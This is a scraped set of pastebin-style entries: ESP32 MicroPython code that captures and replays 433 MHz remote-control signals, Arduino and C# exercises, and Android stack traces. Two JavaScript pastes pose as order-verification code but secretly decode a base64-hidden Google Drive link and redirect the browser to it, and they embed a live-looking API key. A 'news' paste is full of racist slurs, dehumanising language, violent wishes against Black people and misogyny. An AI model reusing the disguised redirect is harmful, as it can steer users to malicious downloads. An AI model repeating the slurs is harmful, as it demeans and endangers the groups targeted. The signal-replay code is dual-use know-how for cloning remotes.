    return abs(poprz - akt) <= poprz * (ile_procent / 100)

""""""
# prosty filtr
@micropython.native
def filtr(pin, max_probek = 5, czas_sygn_min = 1000, czas_sygn_max = 30000, procent_delta = 0.8, procent_czas = 0.8):
    licz = delta_poprz = start_poprz = 0; stan = pin.value()
    while licz < max_probek:
        czas_teraz = time.ticks_us()
        while pin.value() == stan:
            pass
        delta_teraz = time.ticks_diff(time.ticks_us(), czas_teraz)
        stan = pin.value()
        if stan == 1 and czas_sygn_min < delta_teraz < czas_sygn_max: # jeeli stan == 1, to wczeniej byo 0
            licz = (licz + 1) if (tolerancja(delta_poprz, delta_teraz, procent_delta) and tolerancja(start_poprz, czas_teraz, procent_czas)) else 0
            delta_poprz, start_poprz = delta_teraz, czas_teraz
        elif delta_teraz > czas_sygn_max: # wyjscie odbiornika milknie na dusz chwil, sygna zosta odebrany
            break
    print(""\n> zwrot: %s <\n"" % (licz == max_probek))
    return licz == max_probek # jeeli licznik osign max_prbek, wtedy zwracam True, inaczej False
    """"""

# prosty filtr
@micropython.native
def filtr(pin, max_probek = 6, czas_sygn_min = 1500, czas_sygn_max = 30000, procent_delta = 0.8, procent_czas = 0.8):
    licz = delta_poprz = start_poprz = 0; stan = pin.value()
    while licz < max_probek:
        czas_teraz = time.ticks_us()
        while pin.value() == stan:
            pass
        delta_teraz = time.ticks_diff(time.ticks_us(), czas_teraz)
        stan = pin.value()
        if stan == 1 and czas_sygn_min < delta_teraz < czas_sygn_max: # jeeli stan == 1, to wczeniej byo 0
            licz = (licz + 1) if (tolerancja(delta_poprz, delta_teraz, procent_delta) and tolerancja(start_poprz, czas_teraz, procent_czas)) else 0
            delta_poprz, start_poprz = delta_teraz, czas_teraz
        elif delta_teraz > czas_sygn_max: # wyjscie odbiornika milknie na dusz chwil, sygna zosta odebrany
            break
    #print(""\n> zwrot: %s <\n"" % (licz == max_probek))
    return licz == max_probek # jeeli licznik osign max_prbek, wtedy zwracam True, inaczej False

# odbir sygnaw
@micropython.native
def sygnaly(pin, max_buff = 1000, czas_sygn_max = 30000):
    buff = []; czas_delta = 0
    pierwszy_stan = stan = pin.value()
    while czas_delta < czas_sygn_max and max_buff > 0:
        czas_teraz = time.ticks_us()
        while pin.value() == stan:
            pass
        czas_delta = time.ticks_diff(time.ticks_us(), czas_teraz)
        stan = pin.value()
        buff.append(czas_delta)
        max_buff -= 1
    return (None if max_buff != 0 else (buff, bool(pierwszy_stan)))

# wysyanie, moduRMT z biblioteki esp32

def nadajnik(pin, sygnaly, powtorz = 10):
    # pierwsza odebrana ramka zazwyczaj jest niepena, std ""powtorz + 1"" czyli domylnie +1 ramka wicej
    pin.write_pulses(sygnaly[0] * (powtorz + 1), sygnaly[1]) 
    while not pin.wait_done():
        time.sleep_ms(100)
    
def cpu_boost(boost):
    if boost:
        machine.freq(240000000)
        print(""[CPU]: 240 MHz"")
    else:
        machine.freq(160000000)
        print(""[CPU]: 160 MHz"")
        
def wyswietl_tekst(oled, tekst, spij_ms = 0, odstep_x = 0, odstep_y = 12):
    oled.fill(0)
    t = tekst.split(""\n"")
    odst_y = 0
    for i in t:
        oled.text(i, odstep_x, odst_y, 1)
        odst_y += odstep_y
    oled.show()
    time.sleep_ms(spij_ms)
    
def przycisk_pauza(p):
    while p.value() != 1:
        time.sleep_ms(10)
    
# funkcja gwna - wysya otrzymany bufor sygnaw
# odbiornik: superheterodyna 433 Mhz: ""RX500"" i ""RXB6 v2.0"" (w obu szum na wyjciu)
# nadajnik: SYN115
# anteny: drut 173 mm
if __name__ == ""__main__"":
    #cpu_boost(True)
    pin_odbiornik = machine.Pin(21, machine.Pin.IN)
    pin_nadajnik = esp32.RMT(0, pin = machine.Pin(23, machine.Pin.OUT), clock_div = 80, idle_level = False)
    
    przycisk_a = machine.Pin(26, machine.Pin.IN)
    przycisk_b = machine.Pin(27, machine.Pin.IN)
    
    i2c = machine.I2C(1, scl = machine.Pin(32), sda = machine.Pin(33))
    oled = ssd1306.SSD1306_I2C(128, 64, i2c)
    oled.contrast(10)
    
    wyswietl_tekst(oled, ""= Pilot v0.1 ="", spij_ms = 2000)
    wyswietl_tekst(oled, ""Ekran I2C: %s\nSys: %s\nuPy: %s"" %
                   (i2c.scan(), sys.platform, ""."".join(map(str, sys.implementation[1]))[:-1]), spij_ms = 5000)
    
    #print(""\n[SKAN]: Nacinij i przytrzymaj przycisk pilota ..."", end = """")
    wyswietl_tekst(oled, ""[SKAN]:\n\nNacisnij\nprzycisk\npilota ..."")
    while True:
        gc.collect() # zbieram mieci
        if filtr(pin_odbiornik):
            ret = sygnaly(pin_odbiornik)
            if ret != None:
                sig = signals(ret).return_unique_signals()
                if len(sig) > 0:
                    #print(""\n[INFO]:\tWykrytych kodw:"", len(sig))
                    wyswietl_tekst(oled, ""[INFO]:\n\nWykrytych kodow:\n=> %i"" % len(sig), 5000)
                    for i in sig:
                        #input('\n[TEST]:\tPrzetestuj kod numer: [%i/%i] => nacinij przeciwny przycisk, nastpnie ""Enter"" na klawiaturze ... ' % ((i + 1), len(sig)))
                        #print(sig[i])
                        wyswietl_tekst(oled, '[TEST]:\n\nKod nr: %i/%i\n\nNacisnij (A)' % ((i + 1), len(sig)))
                        przycisk_pauza(przycisk_a)
                        nadajnik(pin_nadajnik, (sig[i], False))
                        #print(""[INFO]:\tWysano kod numer: %i"" % (i + 1))
                        wyswietl_tekst(oled, ""[INFO]:\n\nWyslano kod nr:\n=> %i"" % (i + 1), spij_ms = 2000)
                        
                else:
                    #print(""[BD]: Nie znaleziono poprawnych sygnalow"")
                    wyswietl_tekst(oled, ""[BLAD]:\n\nBrak kodow"", spij_ms = 2000)
                #print(""\n[SKAN]: Nacinij i przytrzymaj przycisk pilota ..."", end = """")
                wyswietl_tekst(oled, ""[SKAN]:\n\nNacisnij\nprzycisk\npilota ..."")
                "
js0aPPSa,**Random Speed** rev_01,pleasedontcode,Arduino,Saturday 19th of April 2025 04:47:54 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **Random Speed**
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-04-19 21:46:14

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Utilize the Adafruit_GFX library to create a */
	/* dynamic graphical display that updates based on */
	/* user input, enhancing interactivity and visual */
	/* feedback in the project. */
/****** SYSTEM REQUIREMENT 2 *****/
	/* Utilize the Adafruit_GFX library to develop an */
	/* interactive graphical display that responds to */
	/* user inputs, providing real-time visual feedback */
	/* and enhancing user experience with dynamic content */
	/* updates. */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <Adafruit_GFX.h>	//https://github.com/adafruit/Adafruit-GFX-Library
#include <Adafruit_TFTLCD.h> // Include the TFT LCD library (assumed needed for tft instance)

// Define the pins for the TFT LCD  
#define TFT_CS     10  
#define TFT_RST    9  
#define TFT_DC     8

// Create an instance of the TFT LCD  
Adafruit_TFTLCD tft(TFT_CS, TFT_DC, TFT_RST); // Create an instance of the TFT LCD

// Speed variable  
int speed = 0; // Speed in km/h (initialized to 0)

// Function to display speed on the TFT
void displaySpeed(int speed) {
    // Clear the previous speed display  
    tft.fillRect(0, 0, 240, 40); // Clear the area for speed display

    // Display the speed  
    tft.setCursor(10, 10);
    tft.print(""Speed: "");
    tft.print(speed);
    tft.print("" km/h"");
}

void setup(void)
{
    // put your setup code here, to run once:
    tft.begin(); // Initialize the TFT  
    tft.setRotation(1); // Set the rotation of the screen  
    tft.fillScreen(WHITE); // Fill the screen with white

    // Set text properties  
    tft.setTextColor(BLACK);
    tft.setTextSize(3);
}

void loop(void)
{
    // put your main code here, to run repeatedly:
    // Simulate speed changes (for testing purposes)
    speed = random(0, 200); // Random speed between 0 and 200 km/h

    // Call function to display the updated speed
    displaySpeed(speed);

    delay(1000); // Update every second  
}

/* END CODE */"
8F4uzhsF,Market.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 04:45:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10914/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
M8vfLbkm,Untitled,Epiphemeral,JavaScript,Saturday 19th of April 2025 04:30:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81752/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WDnbck5x,Sort colors (dutch national flag problem),smj007,Python,Saturday 19th of April 2025 04:29:59 PM CDT,"""""""
Bucket sort: TC is O(n). 
There's this case nums[curr]==2, after swapping with right, we should not increase i since the number swapped back from p2 can be 0/1, which needs to be further processed

When curr pointer has passed left pointer, the number swapped from left can only be
1 as curr pointer has passeed left.

Both of them are tricky to understadn
""""""

class Solution:
    def sortColors(self, nums: List[int]) -> None:
        """"""
        Do not return anything, modify nums in-place instead.
        """"""

        left = 0
        right = len(nums)-1
        i = 0

        while i <= right:
            if nums[i] == 0:
                nums[i], nums[left] = nums[left], nums[i]
                left += 1
            elif nums[i] == 2:
                nums[i], nums[right] = nums[right], nums[i]
                right -= 1
                i -= 1
            i += 1

        "
Y6n3X05Z,C++ Template,Vince14,C++,Saturday 19th of April 2025 03:36:48 PM CDT,"#include <iostream>
#include <string>
#include <cstring>
#include <algorithm>
#include <cmath>
#include <regex>
#include <vector>
#include <set>
#include <map>
#include <stack>
#include <queue>
#include <deque>
#include <unordered_map>
#include <numeric>
#include <iomanip>
using namespace std;
#define pii pair<int, int>
#define ll long long
#define FAST ios_base::sync_with_stdio(false); cin.tie(NULL)
#define mp(x1, x2) ( make_pair(x1, x2) )
const int dx[4] = {1, 0, 0, -1}, dy[4] = {0, 1, -1, 0};
const int dl[2] = {1, -1};
const int MOD = 100000007;
const int MAXN = 202020;

int main(){
    FAST;
    freopen(""combo.in"", ""r"", stdin);
    freopen(""combo.out"", ""w"", stdout);
}
"
8ShXPfnw,News April19 25,Newscaster_Ned,Email,Saturday 19th of April 2025 03:21:57 PM CDT,"...............Test 1...............
...............Test 2...............
...............Test 3...............
..................... Test complete.

Time for another update on those monkeys.

Alleged Tren de Aragua Gang Member Breaks Down Like a Big Baby After Arrest
Police: Man Accused of Raping California Woman He Met on Dating App
Melania Trump Unveils Festivities for White House Easter Egg Roll
NBC's 'Law & Order' Portrays Migrants as Innocent and Cops as Rapists
Jeffrey Goldberg: Reaction to Shapiro Attack by 'Anti-Israel' Perp 'Muted'
Velshi: U.S. Striking Houthis, Who Haven't Claimed Attacks Recently
NYT's Baker: Lefty Violence Exists, Trump More Okay with Dangerous Rhetoric
Brooklyn Tesla Vandalism Suspect Is a Licensed Mental Health Therapist
Boston Celebrates 250th Anniversary of Paul Revere's Ride with Warning
'Shame on You': Kyren Lacy's Agent Blasts NFL for Revoking Combine Invite
Get All Breitbart News Here
HomePage
Supreme Betrayal

SCOTUS Blocks, for Now, New Deportations Under Alien Enemies Act
Supreme Court Chief Justice John Roberts, left, and associate justices, arrive in the Hous
The Supreme Court on Saturday blocked, for now, the deportations of any Venezuelans held in northern Texas under an 18th century wartime law.

Trump Posts Photo of Illegal Aliens Knuckle Tattoos Amid MS-13 Charges
Trump Posts Photo of Illegal Alien's Knuckle Tattoos Amid MS-13 Charges
7,581
David Hogg: The Time for James Carvilles Timid Politics Is Over
David Hogg: The Time for James Carville's 'Timid' Politics Is Over
848
Spurs Gregg Popovich Taken Away in Ambulance After Fainting at Restaurant
Spurs' Gregg Popovich Taken Away in Ambulance After Fainting at Restaurant
80
Poll: Majority Say Democrats Should Not Immediately Resist Trump Agenda
Poll: Majority Say Democrats Should Not Immediately Resist Trump Agenda
107
Democrat Shri Thanedar Calls to Impeach Trump for Sending El Salvadoran Illegal Immigrant to Priso
Democrat Calls to Impeach Trump For Deporting Salvadoran to El Salvador
3,994
Trump Will Walk Away From Ukraine Talks in Days if Moscow and Kyiv Arent Serious About Peace
Trump Will Walk From Ukraine Talks in Days if no Progress Warns Rubio
6,158
Judge Blocks Trump Administration from Deporting to 3rd Countries Without Due Process
Judge Blocks Trump Admin Deporting to 3rd Countries Without Due Process
971
Hillary Clinton: Americans of Conscience Must Stand Against Trump Deporting Illegal A
Hillary Clinton Throws Support Behind Accused MS-13 Gang Member
4,254
Poll: Most Voters Support Moderate Democrats Over Radical AOC and Bernie Sanders
Poll: Most Support Moderate Democrats Over Radical AOC and Bernie Sanders
106
Supreme Court blocks, for now, new deportations under 18th century wartime law
Supreme Court blocks, for now, new deportations under 18th century wartime law

Alabama: White Father Dies from His Injuries After Being Nearly Decapitated by a Hatchet-Wielding Groid.

Let's hope they take care of this negro French style.


Police Searching for Crazed Negro Who Slashed NY Reporter and 2 Others on Subway.


Monkey Indicted After Raping Woman at Claiborne Avenue Gas Station.


Fayetteville Police Searching for Nig Who Raped 11 Women Since 2009.

.......................... Weather.

Sat 19 | Day
82
99%
SSE 20 mph
Windy with showers and thunderstorms likely. High 82F. Winds SSE at 20 to 30 mph. Chance of rain 100%. Higher wind gusts possible.

Humidity
66%
UV Index
5 of 11
Sunrise
6:58 am
Sunset
8:00 pm
Sat 19 | Night
68
24%
SSE 20 mph
Cloudy skies. Low 68F. Winds SSE at 15 to 25 mph. Higher wind gusts possible.

Humidity
83%
UV Index
0 of 11
Moonrise
1:30 am
Waning Gibbous
Moonset
11:27 am
Sun 20
AM Thunderstorms
83
/56
74%
 WNW 8 mph
Mon 21
Partly Cloudy
88
/66
4%
 NE 8 mph
Tue 22
PM Thunderstorms
86
/66
56%
 SE 12 mph
Wed 23
Thunderstorms
80
/68
76%
 SE 11 mph
Thu 24
Scattered Thunderstorms
85
/68
48%
 SSE 13 mph
Fri 25
Scattered Thunderstorms
83
/68
53%
 SE 8 mph
Sat 26
AM Thunderstorms
84
/68
37%
 SE 10 mph
Sun 27
Mostly Cloudy
86
/71
24%
 SSE 13 mph
Mon 28
AM Clouds/PM Sun
86
/70
24%
 SSE 14 mph
Tue 29
PM Thunderstorms
86
/67
51%
 SSE 11 mph
Wed 30
Scattered Thunderstorms
84
/66
43%
 SSE 10 mph
Thu 01
Mostly Cloudy
86
/66
24%
 SSE 11 mph
Fri 02
Partly Cloudy
86
/63
24%
 SE 11 mph
Sat 03
Partly Cloudy
87
/63
24%
 SE 10 mph

..................
Current threat: Zombie Jesus. 
..................

Nihilism
Nihilism is the purported ideology of Anonymous and the moral framework for Encyclopedia Dramatica. A nihilistic attitude involves existentially denying the metaphysical, epistemological and, especially, ethical truth-values of everything pertaining to the world. In other words, the weakest intellectual excuse to do it for the lulz. When applied in practise, nihilism becomes the sweet philosophical nectar from which all win flows forth. Wielding this weapon of thought against one's enemy will bring much joy and will harden the hearts of any man. It is well known that women can't be nihilists because they are emotional, get easily saddened, and are thus made of disgusting fail. This is why they belong where they are most comfortable.

(( There's Nothing Waiting For You At The End. Be Like Us. Spend Every Minute You Have Left With Women, Coke And Insane Amounts Of Cash ))

.................................................

The African hawk-eagle (Aquila spilogaster) is a large bird of prey. Like all eagles, it belongs to the family Accipitridae. The species's feathered legs mark it as a member of the subfamily Aquilinae. The African hawk-eagle breeds in tropical sub-Saharan Africa. It is a bird of assorted woodland, including both savanna and hilly areas, but they tend to occur in typically dry woodland. The species tends to be rare in areas where their preferred habitat type is absent. The African hawk-eagle is powerfully built and hunts small to medium-sized mammals and birds predominantly, occasionally taking reptiles and other prey as well. This African hawk-eagle perching on a branch was photographed in Damaraland, Namibia.

Photograph credit: Charles J. Sharp

........

Well niggers, I guess that's it... Y'know that table is really sexy. I'm gonna go fuck it."
TCcS33ua,2025-04-19T22:16:47.187935,powerampache,PHP,Saturday 19th of April 2025 03:16:30 PM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":7},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":27412293,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}]}"
XSjkksvV,2025-04-19T22:16:46.493678,powerampache,PHP,Saturday 19th of April 2025 03:16:30 PM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":7},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":27411908,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}]}"
NtK5X4m3,Homework42,JohnJuly,C#,Saturday 19th of April 2025 03:14:55 PM CDT,"using System;
using System.Collections.Generic;

namespace Homework42_
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Library library = new Library();

            library.IsWork();
        }
    }

    class Book
    {
        public Book(string title, string author, int yearOfRelease, int number)
        {
            Title = title;
            Author = author;
            YearOfRelease = yearOfRelease;
            Number = number;
        }

        public string Title { get; private set; }
        public string Author { get; private set; }
        public int YearOfRelease { get; private set; }
        public int Number { get; private set; }

        public void ShowInfo()
        {
            Console.WriteLine($""{Number}. : {Title} | : {Author} |  : {YearOfRelease}"");
        }
    }

    class Library
    {
        private List<Book> _books;

        public Library()
        {
            _books = new List<Book>();
        }

        public void IsWork()
        {
            const string CommandAddBook = ""add"";
            const string CommandRemoveBook = ""del"";
            const string CommandShowBooks = ""show"";
            const string CommandFindBook = ""find"";
            const string CommandExitLibrary = ""exit"";

            bool isWork = true;

            while (isWork)
            {
                Console.WriteLine(""    "");
                Console.WriteLine($"" {CommandAddBook}     ."");
                Console.WriteLine($"" {CommandRemoveBook}     ."");
                Console.WriteLine($"" {CommandShowBooks}        ."");
                Console.WriteLine($"" {CommandFindBook}    ."");
                Console.WriteLine($"" {CommandExitLibrary}    ."");
                Console.Write("" : "");

                string userInput = Console.ReadLine();

                switch (userInput)
                {
                    case CommandAddBook:
                        AddBook();
                        break;

                    case CommandRemoveBook:
                        RemoveBook();
                        break;

                    case CommandShowBooks:
                        ShowAllBooks();
                        break;

                    case CommandFindBook:
                        FindBook();
                        break;

                    case CommandExitLibrary:
                        isWork = ExitProgram();
                        break;

                    default:
                        Console.WriteLine("" ,   ."");
                        break;
                }

                Console.ReadKey();
                Console.Clear();
            }
        }

        private void AddBook()
        {
            Console.WriteLine(""  :"");
            string bookTitle = Console.ReadLine();

            Console.WriteLine(""  :"");
            string bookAuthor = Console.ReadLine();

            int bookYearOfRelease = ReadNumber(""   :"");

            int bookNumber = _books.Count + 1;

            _books.Add(new Book(bookTitle, bookAuthor, bookYearOfRelease, bookNumber));

            Console.WriteLine("" !"");
        }

        private void RemoveBook()
        {
            if (IsEmptyListBooks() == false)
            {
                int bookNumber = ReadNumber(""    "");

                if (TryGetBook(bookNumber, out Book book))
                {
                    _books.Remove(book);
                }
                else
                {
                    Console.WriteLine(""    !"");
                }

                Console.WriteLine("" !"");
            }
        }

        private void ShowAllBooks()
        {
            if (IsEmptyListBooks() == false)
            {
                Console.WriteLine("" :"");

                foreach (Book book in _books)
                {
                    book.ShowInfo();
                }
            }
        }

        private void FindBook()
        {
            if (IsEmptyListBooks() == false)
            {
                const string CommandFindByName = ""name"";
                const string CommandFindByAuthor = ""author"";
                const string CommandFindByYearOfRelease = ""year"";

                Console.WriteLine(""  "");
                Console.WriteLine($"" {CommandFindByName}      "");
                Console.WriteLine($"" {CommandFindByAuthor}      "");
                Console.WriteLine($"" {CommandFindByYearOfRelease}        "");

                string userInput = Console.ReadLine();

                switch (userInput)
                {
                    case CommandFindByName:
                        FindByName();
                        break;

                    case CommandFindByAuthor:
                        FindByAuthor();
                        break;

                    case CommandFindByYearOfRelease:
                        FindByYearOfRelease();
                        break;

                    default:
                        Console.WriteLine("" ,   ."");
                        break;
                }

                Console.ReadKey();
                Console.Clear();
            }
        }

        private void FindByName()
        {
            bool isFoundName = false;
            string searchName = Console.ReadLine();

